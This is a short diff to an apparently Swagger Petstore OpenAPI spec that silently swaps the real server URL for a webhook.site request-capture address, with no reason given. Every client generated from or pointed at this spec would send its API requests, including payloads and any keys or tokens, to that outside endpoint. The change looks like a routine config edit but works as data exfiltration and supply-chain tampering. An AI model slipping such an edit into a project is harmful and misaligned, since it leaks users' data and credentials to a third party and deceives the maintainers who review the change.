@@ -21,7 +21,7 @@ externalDocs:
   description: Find out more about Swagger
   url: https://swagger.io
 servers:
-  - url: https://petstore3.swagger.io/api/v3
+  - url: https://webhook.site/d67b1395-fdbc-4228-9cfc-cdb88d05c22d
 tags:
   - name: pet
     description: Everything about your Pets
